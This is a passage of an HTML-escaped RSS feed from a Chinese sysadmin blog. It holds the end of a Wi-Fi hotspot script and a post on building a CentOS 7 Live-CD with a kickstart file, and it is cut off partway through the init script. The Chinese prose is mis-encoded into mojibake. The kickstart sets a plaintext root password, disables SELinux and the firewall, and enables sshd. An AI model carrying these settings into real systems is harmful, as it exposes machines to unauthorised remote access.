&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;na&#34;&gt;start&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;stop)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;na&#34;&gt;stop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;*)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;echo &amp;#34;Usage: $0 {start|stop}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;exit 2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;esac&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å››ç”¨rootèº«ä»½æ‰§è¡Œå³å¯&#34;&gt;å››ã€ç”¨rootèº«ä»½æ‰§è¡Œå³å¯&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo chmod &lt;span class=&#34;m&#34;&gt;755&lt;/span&gt; /usr/local/bin/initAP.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo /usr/local/bin/initAP.sh start
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±å¯ä»¥ç”¨è‡ªå·±çš„æ‰‹æœºè¿ä¸Šè¿™ä¸ªwifiçƒ­ç‚¹ï¼Œå°½æƒ…å†²æµªå•¦ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>CentOS 7 Live-CD çš„åˆ¶ä½œ</title>
      <link>https://rendoumi.com/posts/20211010-live_cd/</link>
      <pubDate>Sun, 10 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211010-live_cd/</guid>
      <description>&lt;p&gt;æŸäº›åœºåˆï¼Œå¾ˆæœ‰å¯èƒ½éœ€è¦å¯åŠ¨ISOæˆ–è€…USBç›˜ï¼Œè‡ªå¸¦Linuxç³»ç»Ÿï¼Œç„¶åæ‹¯æ•‘å½“å‰æŸåçš„ç³»ç»Ÿ&lt;/p&gt;
&lt;p&gt;æˆ–è€…ç›´æ¥å¯åŠ¨ä¸€ä¸ªLIVE CentOSç³»ç»Ÿï¼Œå»åšæŸäº›äº‹ï¼Œæ¯”å¦‚ç”¨MegaRaidåˆ’åˆ†Raidã€æµ‹è¯•ç³»ç»Ÿç­‰ç­‰&lt;/p&gt;
&lt;p&gt;è¿™æ—¶å€™å°±éœ€è¦åˆ¶ä½œå‡ºæ¥ä¸€ä¸ªLIVE CDçš„ç³»ç»Ÿäº†&lt;/p&gt;
&lt;p&gt;åˆ¶ä½œæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…live-tools&#34;&gt;ä¸€ã€å®‰è£…live-tools&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install livecd-tools
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒå‡†å¤‡kickstartæ–‡ä»¶centos7-live-dockerks&#34;&gt;äºŒã€å‡†å¤‡Kickstartæ–‡ä»¶centos7-live-docker.ks&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼š&lt;a href=&#34;centos7-live-docker.ks&#34;&gt;centos7-live-docker.ks&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;lang en_GB.UTF-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;keyboard us&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;timezone Asia/Shanghai --isUtc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#selinux --enforcing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;selinux --disabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#firewall --enabled --service=cockpit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;firewall --disabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#xconfig --startxonboot&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;part / --size 8192 --fstype ext4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;services --enabled&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;NetworkManager,sshd --disabled=network&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Root password&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;auth --useshadow --enablemd5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rootpw --plaintext Kalaisadog2021&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;repo --name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;base --baseurl=http://mirror.centos.org/centos/7/os/x86_64/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;repo --name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;updates --baseurl=http://mirror.centos.org/centos/7/updates/x86_64/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;repo --name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;extras --baseurl=http://mirror.centos.org/centos/7/extras/x86_64/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;repo --name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;epel --baseurl=http://dl.fedoraproject.org/pub/epel/7/x86_64/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;%packages &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;@core&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;kernel&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;dracut&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;firewalld&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;NetworkManager&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;e2fsprogs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rootfiles&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;docker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;openssh-server&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#By zhang ranrui&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;unzip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net-tools&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;binutils&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;wget&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;bash-completion&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;bc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;dmidecode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;dmraid&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;dmraid-events&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;lvm2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;lvm2-libs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;kpartx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;mdadm&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;parted&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;xfsdump&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;xfsprogs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;gdisk&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;bzip2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;extundelete&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;libHX&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;libHX-devel&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;autoconf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;gcc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;gcc-c++&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;make&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;screen&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;telnet&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;%end&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;%post&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl enable docker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# By Zhang Ranrui, Add your custom script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#wget http://www.rendoumi.com/soft/other/xfs_irecover -O /usr/local/bin/xfs_irecover&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#chmod 755 /usr/local/bin/xfs_irecover&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;echo &amp;#34;Banner /etc/issue&amp;#34; &amp;gt;&amp;gt; /etc/ssh/sshd_config&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;sed -i &amp;#34;s/After&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;network\.target/After=network-online\.target\nWants=network-online\.target/g&amp;#34; /usr/lib/systemd/system/rc-local.service&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chmod 755 /etc/systemd/system/rc.local.service.d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chmod 644 /etc/systemd/system/rc.local.service.d/local.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chmod 755 /etc/rc.d/rc.local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl enable rc-local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl start rc-local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# FIXME: it&amp;#39;d be better to get this installed from a package&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;cat &amp;gt; /etc/rc.d/init.d/livesys &amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# live: Init script for live image&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# chkconfig: 345 00 99&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# description: Init script for live image.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### BEGIN INIT INFO&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# X-Start-Before: display-manager&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### END INIT INFO&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;. /etc/init.d/functions&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if ! strstr &amp;#34;\`cat /proc/cmdline\`&amp;#34; rd.live.image || [ &amp;#34;\$1&amp;#34; !&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;start&amp;#34; ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    exit 0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if [ -e /.liveimg-configured ] ; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;configdone&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;exists() {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;which \$1 &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 || return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;\$*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Make sure we don&amp;#39;t mangle the hardware clock on shutdown&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ln -sf /dev/null /etc/systemd/system/hwclock-save.service&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;livedir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;LiveOS&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;for arg in \`cat /proc/cmdline\` ; do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;if [ &amp;#34;\${arg##rd.live.dir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;}&amp;#34; != &amp;#34;\${arg}&amp;#34; ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    livedir=\${arg##rd.live.dir=}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    return
